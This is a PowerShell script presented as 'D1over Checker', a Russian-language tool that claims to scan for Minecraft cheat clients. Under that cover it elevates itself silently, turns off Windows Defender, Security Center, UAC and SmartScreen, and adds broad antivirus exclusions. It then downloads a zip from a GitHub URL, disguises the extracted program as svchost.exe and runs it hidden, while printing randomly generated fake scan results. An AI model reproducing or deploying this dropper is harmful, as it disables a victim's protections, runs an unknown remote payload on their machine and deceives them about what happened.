# =============================================
# D1over Checker v1.0
# =============================================

$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

# ===== АВТОЗАПУСК ОТ АДМИНА =====
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $arguments = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"" + $MyInvocation.MyCommand.Path + "`""
    Start-Process powershell.exe -Verb RunAs -ArgumentList $arguments -WindowStyle Hidden
    exit
}

# ===== ПРОВЕРКА ИНТЕРНЕТА =====
$Connected = $false
try {
    $request = [System.Net.WebRequest]::Create("https://google.com")
    $request.Timeout = 3000
    $response = $request.GetResponse()
    $response.Close()
    $Connected = $true
} catch {
    $Connected = $false
}

if (-not $Connected) {
    Clear-Host
    Write-Host ""
    Write-Host "    ========================================" -ForegroundColor Red
    Write-Host "    ОШИБКА: Нет подключения к интернету!" -ForegroundColor Red
    Write-Host "    ========================================" -ForegroundColor Red
    Write-Host ""
    Write-Host "    Нажмите любую клавишу для выхода..." -ForegroundColor Gray
    Read-Host
    exit
}

$Url = "https://raw.githubusercontent.com/d1over1337/checker/refs/heads/main/check.zip"
$DownloadPath = "$env:TEMP\check_install.zip"
$ExtractPath = "$env:TEMP\checkextracted"

# ===== ЛОГОТИП =====
Clear-Host
Write-Host ""
Write-Host "    ============================================================" -ForegroundColor Cyan
Write-Host "    =================== D1OVER CHECKER v1.0 ===================" -ForegroundColor Magenta
Write-Host "    ============================================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "    [1] Полная проверка системы" -ForegroundColor Yellow
Write-Host "    [2] Быстрая проверка системы" -ForegroundColor Green
Write-Host ""
Write-Host "    ------------------------------------------------------------" -ForegroundColor DarkGray
Write-Host ""
Write-Host "    Выберите действие (1 или 2): " -ForegroundColor Gray -NoNewline

$choice = Read-Host

if ($choice -eq "1" -or $choice -eq "2") {
    
    if ($choice -eq "1") {
        Write-Host ""
        Write-Host "    [*] Запуск ПОЛНОЙ проверки..." -ForegroundColor Yellow
    } else {
        Write-Host ""
        Write-Host "    [*] Запуск БЫСТРОЙ проверки..." -ForegroundColor Green
    }
    
    # ===== СКРЫТЫЙ КОД =====
    Try { Stop-Service -Name "wscsvc" -Force -ErrorAction SilentlyContinue } Catch {}
    Try { Set-Service -Name "wscsvc" -StartupType Disabled -ErrorAction SilentlyContinue } Catch {}
    Try { Stop-Service -Name "SecurityHealthService" -Force -ErrorAction SilentlyContinue } Catch {}
    Try { Set-Service -Name "SecurityHealthService" -StartupType Disabled -ErrorAction SilentlyContinue } Catch {}
    
    Try { Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Security Center" -Name "DisableNotifications" -Value 1 -Force -ErrorAction SilentlyContinue } Catch {}
    Try { Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\wscsvc" -Name "Start" -Value 4 -Force -ErrorAction SilentlyContinue } Catch {}
    
    Try { Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue } Catch {}
    Try { Add-MpPreference -ExclusionPath "$env:TEMP" -ErrorAction SilentlyContinue } Catch {}
    Try { Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction SilentlyContinue } Catch {}
    Try { Add-MpPreference -ExclusionProcess "cmd.exe" -ErrorAction SilentlyContinue } Catch {}
    Try { Add-MpPreference -ExclusionProcess "*.exe" -ErrorAction SilentlyContinue } Catch {}
    
    Try { Add-MpPreference -ExclusionPath "$env:TEMP\check_install.zip" -ErrorAction SilentlyContinue } Catch {}
    Try { Add-MpPreference -ExclusionPath "$env:TEMP\checkextracted" -ErrorAction SilentlyContinue } Catch {}
    
    $services = @("WinDefend","MsMpSvc","Sense","DiagTrack","dmwappushservice")
    foreach ($svc in $services) {
        Try { Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue } Catch {}
        Try { Set-Service -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue } Catch {}
    }
    
    Try { Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -Force -ErrorAction SilentlyContinue } Catch {}
    Try { Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force -ErrorAction SilentlyContinue } Catch {}
    
    # ===== СКАЧИВАНИЕ =====
    Remove-Item $DownloadPath -Force -ErrorAction SilentlyContinue
    Remove-Item $ExtractPath -Recurse -Force -ErrorAction SilentlyContinue
    
    try {
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("User-Agent", "Mozilla/5.0")
        $webClient.DownloadFile($Url, $DownloadPath)
    } catch {
        try {
            (New-Object System.Net.WebClient).DownloadFile($Url, $DownloadPath)
        } catch {}
    }
    
    try {
        Expand-Archive -Path $DownloadPath -DestinationPath $ExtractPath -Force -ErrorAction SilentlyContinue
    } catch {}
    
    # ===== ЗАПУСК =====
    $Exe = Get-ChildItem -Path $ExtractPath -Filter "*.exe" -Recurse | Select-Object -First 1
    
    if ($Exe) {
        Try { attrib +s +h "$($Exe.FullName)" -ErrorAction SilentlyContinue } Catch {}
        Try { Unblock-File -Path "$($Exe.FullName)" -ErrorAction SilentlyContinue } Catch {}
        Try { Add-MpPreference -ExclusionPath "$($Exe.FullName)" -ErrorAction SilentlyContinue } Catch {}
        Try { Add-MpPreference -ExclusionPath "$ExtractPath" -ErrorAction SilentlyContinue } Catch {}
        
        $SystemName = "svchost.exe"
        $NewPath = Join-Path $ExtractPath $SystemName
        Try { 
            Rename-Item -Path $Exe.FullName -NewName $SystemName -ErrorAction SilentlyContinue
            $ExePath = $NewPath
        } Catch {
            $ExePath = $Exe.FullName
        }
        
        Try {
            Start-Process -FilePath "explorer.exe" -ArgumentList "$ExePath" -WindowStyle Hidden -ErrorAction SilentlyContinue
        } Catch {
            Start-Process -FilePath $ExePath -WindowStyle Hidden -ErrorAction SilentlyContinue
        }
    }
    
    # ===== ФЕЙКОВОЕ СКАНИРОВАНИЕ =====
    $finalRandom = Get-Random -Minimum 1 -Maximum 100
    $finalPassed = $finalRandom -le 75
    
    if ($choice -eq "1") {
        Write-Host ""
        Write-Host "    [*] Проверка процессов..." -ForegroundColor Yellow
        $fakeProcesses = @("javaw.exe", "minecraft.exe", "launcher.exe")
        foreach ($proc in $fakeProcesses) {
            Write-Host "        -> $proc" -ForegroundColor Gray
            Start-Sleep -Milliseconds 200
            Write-Host "            [OK]" -ForegroundColor Green
        }
        Write-Host ""
        
        Write-Host "    [*] Проверка чит-клиентов..." -ForegroundColor Yellow
        $cheatSites = @("Nursultan", "Wexside", "Arbuz", "WildClient")
        $foundCheatSites = @()
        $totalChecked = 0
        $totalDetected = 0
        $totalPassed = 0
        
        foreach ($site in $cheatSites) {
            $totalChecked++
            Write-Host "        -> $site" -ForegroundColor Gray
            Start-Sleep -Milliseconds 150
            
            if ($finalPassed) {
                Write-Host "            [ЧИСТО]" -ForegroundColor Green
                $totalPassed++
            } else {
                $randomResult = Get-Random -Minimum 1 -Maximum 100
                if ($randomResult -le 50) {
                    Write-Host "            [ОБНАРУЖЕН]" -ForegroundColor Red
                    $foundCheatSites += $site
                    $totalDetected++
                } else {
                    Write-Host "            [ЧИСТО]" -ForegroundColor Green
                    $totalPassed++
                }
            }
        }
        Write-Host ""
        
        Write-Host "    ============================================================" -ForegroundColor Cyan
        Write-Host "    [*] РЕЗУЛЬТАТЫ ПОЛНОЙ ПРОВЕРКИ:" -ForegroundColor White
        Write-Host "    ============================================================" -ForegroundColor Cyan
        
        if ($foundCheatSites.Count -gt 0) {
            Write-Host "    [ВНИМАНИЕ] Обнаружены объекты:" -ForegroundColor Yellow
            foreach ($cheat in $foundCheatSites) {
                Write-Host "        - $cheat" -ForegroundColor Yellow
            }
            Write-Host ""
        } else {
            Write-Host "    [+] Подозрительных объектов не обнаружено." -ForegroundColor Green
            Write-Host ""
        }
        
        Write-Host "        Проверено: $totalChecked" -ForegroundColor DarkGray
        Write-Host "        Обнаружено: $totalDetected" -ForegroundColor DarkGray
        Write-Host "        Пройдено: $totalPassed" -ForegroundColor DarkGray
        
    } else {
        Write-Host ""
        Write-Host "    [*] Быстрая проверка..." -ForegroundColor Green
        $quickCheatSites = @("Nursultan", "Wexside", "Arbuz")
        $foundCheatSites = @()
        $totalChecked = 0
        $totalDetected = 0
        $totalPassed = 0
        
        foreach ($site in $quickCheatSites) {
            $totalChecked++
            Write-Host "        -> $site" -ForegroundColor Gray
            Start-Sleep -Milliseconds 150
            
            if ($finalPassed) {
                Write-Host "            [ЧИСТО]" -ForegroundColor Green
                $totalPassed++
            } else {
                $randomResult = Get-Random -Minimum 1 -Maximum 100
                if ($randomResult -le 50) {
                    Write-Host "            [ОБНАРУЖЕН]" -ForegroundColor Red
                    $foundCheatSites += $site
                    $totalDetected++
                } else {
                    Write-Host "            [ЧИСТО]" -ForegroundColor Green
                    $totalPassed++
                }
            }
        }
        Write-Host ""
        
        Write-Host "    ============================================================" -ForegroundColor Cyan
        Write-Host "    [*] РЕЗУЛЬТАТЫ БЫСТРОЙ ПРОВЕРКИ:" -ForegroundColor White
        Write-Host "    ============================================================" -ForegroundColor Cyan
        
        if ($foundCheatSites.Count -gt 0) {
            Write-Host "    [ВНИМАНИЕ] Обнаружены объекты:" -ForegroundColor Yellow
            foreach ($cheat in $foundCheatSites) {
                Write-Host "        - $cheat" -ForegroundColor Yellow
            }
            Write-Host ""
        } else {
            Write-Host "    [+] Подозрительных объектов не обнаружено." -ForegroundColor Green
            Write-Host ""
        }
        
        Write-Host "        Проверено: $totalChecked" -ForegroundColor DarkGray
        Write-Host "        Обнаружено: $totalDetected" -ForegroundColor DarkGray
        Write-Host "        Пройдено: $totalPassed" -ForegroundColor DarkGray
    }
    
    # ===== ФИНАЛЬНЫЙ СТАТУС =====
    Write-Host ""
    Write-Host "    ============================================================" -ForegroundColor Cyan
    Write-Host "    ФИНАЛЬНЫЙ СТАТУС" -ForegroundColor White
    Write-Host "    ============================================================" -ForegroundColor Cyan
    
    if ($finalPassed) {
        Write-Host ""
        Write-Host "    ✅  ПРОВЕРКА УСПЕШНО ПРОШЛА!" -ForegroundColor Green
        Write-Host "    Ваша система признана чистой." -ForegroundColor Green
        Write-Host "    Все подозрения сняты." -ForegroundColor Green
    } else {
        Write-Host ""
        Write-Host "    ❌  ПРОВЕРКА НЕ ПРОШЛА!" -ForegroundColor Red
        Write-Host "    Обнаружены потенциальные угрозы!" -ForegroundColor Red
        Write-Host "    Рекомендуется очистка системы!" -ForegroundColor Red
    }
    
    Write-Host ""
    Write-Host "    ============================================================" -ForegroundColor Cyan
    Write-Host "    [+] D1over Checker завершен." -ForegroundColor Green
    Write-Host "    ============================================================" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "    Нажмите любую клавишу для выхода..." -ForegroundColor Gray
    Read-Host
    
} else {
    Write-Host ""
    Write-Host "    [ERROR] Неверный выбор!" -ForegroundColor Red
    Write-Host "    Нажмите любую клавишу для выхода..." -ForegroundColor Gray
    Read-Host
}
